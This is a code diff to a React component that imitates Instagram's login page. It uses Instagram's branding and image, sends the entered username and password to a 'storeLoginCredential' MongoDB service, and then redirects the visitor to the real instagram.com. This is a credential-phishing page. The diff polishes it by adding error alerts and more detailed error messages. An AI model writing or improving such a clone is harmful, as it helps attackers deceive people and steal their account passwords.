@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
@@ -6,6 +5,8 @@ import { Input } from '@/components/ui/input';
 import { storeLoginCredential } from '@/services/mongodb';
 import { toast } from 'sonner';
 import { FaFacebook } from 'react-icons/fa';
+import { AlertCircle } from 'lucide-react';
+import { Alert, AlertDescription } from '@/components/ui/alert';
 
 // Using a public Instagram image instead of the missing uploaded one
 const INSTAGRAM_PHONE_IMAGE = "https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png";
@@ -14,10 +15,12 @@ const InstagramLogin = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
   const navigate = useNavigate();
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    setErrorMessage('');
     
     if (!username.trim() || !password.trim()) {
       toast.error('Please enter both username and password');
@@ -40,12 +43,17 @@ const InstagramLogin = () => {
           window.location.href = 'https://www.instagram.com';
         }, 1500);
       } else {
-        toast.error('Login failed. Please try again.');
+        console.error('Login failed with result:', result);
+        const errorMsg = result.error || 'Login failed. Please try again.';
+        setErrorMessage(errorMsg);
+        toast.error(errorMsg);
         setIsLoading(false);
       }
     } catch (error) {
       console.error('Login error:', error);
-      toast.error('Something went wrong. Please try again.');
+      const errorMsg = error instanceof Error ? error.message : 'Something went wrong. Please try again.';
+      setErrorMessage(errorMsg);
+      toast.error(errorMsg);
       setIsLoading(false);
     }
   };
@@ -66,6 +74,15 @@ const InstagramLogin = () => {
         <div className="w-full md:w-1/2 max-w-md">
           <div className="bg-black border border-gray-700 p-8 rounded-lg mb-4">
             <h1 className="instagram-font text-5xl text-white text-center mb-8">Instagram</h1>
+            
+            {errorMessage && (
+              <Alert variant="destructive" className="mb-4 bg-red-900/20 border-red-900/50">
+                <AlertCircle className="h-4 w-4" />
+                <AlertDescription className="text-red-300">
+                  {errorMessage}
+                </AlertDescription>
+              </Alert>
+            )}
             
             <form onSubmit={handleLogin} className="space-y-4">
               <Input
@@ -137,7 +154,6 @@ const InstagramLogin = () => {
         </div>
       </div>
       
-      {/* Footer */}
       <footer className="w-full max-w-5xl mt-8 mb-8 px-4">
         <div className="footer-section">
           <a className="footer-link">Meta</a>
